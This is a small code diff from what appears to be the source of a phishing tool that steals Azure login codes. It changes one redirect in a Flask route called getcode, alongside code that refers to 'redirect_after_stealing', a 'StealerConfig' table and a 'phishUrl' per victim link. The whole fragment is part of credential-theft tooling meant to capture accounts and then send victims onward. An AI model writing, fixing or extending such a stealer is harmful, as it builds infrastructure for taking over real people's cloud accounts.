@@ -474,7 +474,7 @@ def getcode(uuid):
             print(redirect_after_stealing)
             return redirect(redirect_after_stealing)
         else:
-            return redirect(f"/azure/getcode/{current_user.id}")
+            return redirect(f"/azure/getcode/{uuid}")
     try:
         url = StealerConfig.query.filter_by(uuid=uuid).first().phishUrl
     except:
